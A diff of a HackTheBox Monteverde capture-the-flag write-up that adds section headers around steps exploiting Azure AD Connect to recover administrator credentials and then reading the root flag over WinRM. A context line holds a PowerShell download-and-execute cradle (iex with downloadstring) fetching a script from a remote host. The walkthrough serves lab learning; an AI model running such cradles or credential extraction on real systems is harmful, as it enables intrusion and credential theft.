@@ -259,6 +259,10 @@ If we check `C:\Program Files`, we can also see `Azure AD Sync` and `Azure AD Co
 
 ![](/assets/images/htb/monteverde/18.png)
 
+---
+
+## AD Connect Exploit
+
 Googling Azure AD sync exploit brought me to [xpn azure AD Red Team](https://blog.xpnsec.com/azuread-connect-for-redteam/).  
 
 XPN does a great job explaining how everything works and provides us with a script that we need to modify to get it working.  
@@ -290,11 +294,15 @@ Once we do that we will run `iex(new-object net.webclient).downloadstring('http:
 
 ![](/assets/images/htb/monteverde/20.png)
 
+---
+
+
+## Post-Exploitation and Flag
+
 We now have administrator credentials and can log in through WinRM as Administrator.
 
 ![](/assets/images/htb/monteverde/21.png)
 
-## Post-Exploitation and Flag
  Lastly, as usual per HTB, we can go to `C:\users\administrator\desktop\`  
 
  and `cat root.txt`
